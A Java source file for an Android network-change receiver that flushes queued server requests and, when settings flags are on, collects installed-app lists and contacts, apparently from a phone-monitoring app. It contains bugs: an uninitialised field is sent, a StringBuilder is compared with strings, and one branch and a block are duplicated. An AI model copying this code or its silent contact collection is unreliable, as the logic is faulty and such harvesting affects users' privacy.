package com.inet.android.bs;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.preference.PreferenceManager;

import com.inet.android.archive.ListApp;
import com.inet.android.contacts.GetContacts;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.request.DataRequest;
import com.inet.android.request.DelRequest;
import com.inet.android.request.OnDemandRequest;
import com.inet.android.request.PeriodicRequest;
import com.inet.android.request.StartRequest;
import com.inet.android.utils.Logging;

public class NetworkChangeReceiver extends BroadcastReceiver {
	File outFile;
	File tmpFile;
	String str;
	BufferedReader fin;
	BufferedWriter fout;
	SharedPreferences sp;
	Editor ed;
	Context mContext;
	RequestDataBaseHelper db;
	DataRequest dataReq;
	private boolean network;
	public static final String LOG_TAG = "NetworkChangeReciever";

	@Override
	public void onReceive(final Context mContext, final Intent intent) {
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();
		this.mContext = mContext;
		final ConnectivityManager connMgr = (ConnectivityManager) mContext
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		final android.net.NetworkInfo wifi = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

		final android.net.NetworkInfo mobile = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

		StringBuilder sendStrings = new StringBuilder();
		Logging.doLog(LOG_TAG, sendStrings.toString(), sendStrings.toString());
		Logging.doLog(LOG_TAG, "NetWorkChange - begin", "NetWorkChange - begin");

		if (wifi.isConnected() || mobile.isConnected()) {
			Logging.doLog(LOG_TAG, "NetWorkChange - available",
					"NetWorkChange - available");
			// ------------set netWorkAvailable-----------------------------
			setNetworkAvailable(true);
			File database = mContext.getDatabasePath("request_database.db");

			if (!database.exists() || database.length() == 0) {
				// Database does not exist so copy it from assets here
				Logging.doLog(LOG_TAG, "DataBase Not Found");
				return;
			} else {
				db = new RequestDataBaseHelper(mContext);
				Logging.doLog(LOG_TAG, "Found");
			}
			List<RequestWithDataBase> listReq = db.getAllRequest();
			for (RequestWithDataBase req : listReq) {
				if (req.getRequest() != null
						&& !req.getRequest().toString().equals("")
						&& !req.getRequest().toString().equals(" ")) {

					if (req.getType() == 3) {
						if (!sendStrings.toString().equals(" "))
							sendStrings.append(",");

						Logging.doLog("NetworkChangeReceiver sendRequest =3",
								req.getRequest(), req.getRequest());

						sendStrings.append(req.getRequest());

						Logging.doLog(LOG_TAG, "sendString: " + sendStrings);

						db.deleteRequest(new RequestWithDataBase(req.getID()));
					} else if (req.getType() == 1) {
						Logging.doLog(
								"NetworkChangeReceiver sendRequest type = 1",
								req.getRequest(), req.getRequest());
						StartRequest sr = new StartRequest(mContext);
						sr.sendRequest(req.getRequest());
						db.deleteRequest(new RequestWithDataBase(req.getID()));

					} else if (req.getType() == 2) {
						Logging.doLog(
								"NetworkChangeReceiver sendRequest type = 2",
								req.getRequest(), req.getRequest());
						PeriodicRequest pr = new PeriodicRequest(mContext);
						pr.sendRequest(req.getRequest());
						db.deleteRequest(new RequestWithDataBase(req.getID()));

					} else if (req.getType() == 4) {
						Logging.doLog(
								"NetworkChangeReceiver sendRequest type = 4",
								req.getRequest(), req.getRequest());
						DelRequest dr = new DelRequest(mContext);
						dr.sendRequest(req.getRequest());
						db.deleteRequest(new RequestWithDataBase(req.getID()));

					} else if (req.getType() == 5) {
						Logging.doLog(
								"NetworkChangeReceiver sendRequest type = 5",
								req.getRequest(), req.getRequest());
						OnDemandRequest dr = new OnDemandRequest(mContext,
								req.getTypeList(), req.getComplete(),
								req.getVersion());
						dr.sendRequest(str);
						db.deleteRequest(new RequestWithDataBase(req.getID()));

					}
				} else {
					db.deleteRequest(new RequestWithDataBase(req.getID()));
				}
			}
			if (!sendStrings.equals("") && !sendStrings.equals("null")) {
				Logging.doLog(LOG_TAG,
						"before send: " + sendStrings.toString(),
						"before send: " + sendStrings.toString());
				dataReq = new DataRequest(mContext);
				dataReq.sendRequest(sendStrings.toString());
			}
			callOnceOnly();

		} else {
			// ------------set netWorkAvailable-----------------------------
			Logging.doLog(LOG_TAG, "Internet false ", "Internet false ");
			setNetworkAvailable(false);
		}
	}

	private void callOnceOnly() {
		if (sp.getString("statusAppList", "0").equals("1")) {
			ListApp listApp = new ListApp();
			listApp.getListOfInstalledApp(mContext);
		}
		if (sp.getString("contacts_list", "0").equals("1")) {
			GetContacts getCont = new GetContacts();
			getCont.execute(mContext);
		}
		if (sp.getString("statusCallList", "0").equals("1")) {
			ListApp listApp = new ListApp();
			listApp.getListOfInstalledApp(mContext);
		}
		if (sp.getString("contacts_list", "0").equals("1")) {
			GetContacts getCont = new GetContacts();
			getCont.execute(mContext);
		}
	}

	public void setNetworkAvailable(boolean network) {
		this.network = network;
		ed.putBoolean("nework_available", network);
		ed.commit();
		Logging.doLog(LOG_TAG, "network" + Boolean.toString(network), "network"
				+ Boolean.toString(network));
	}

}
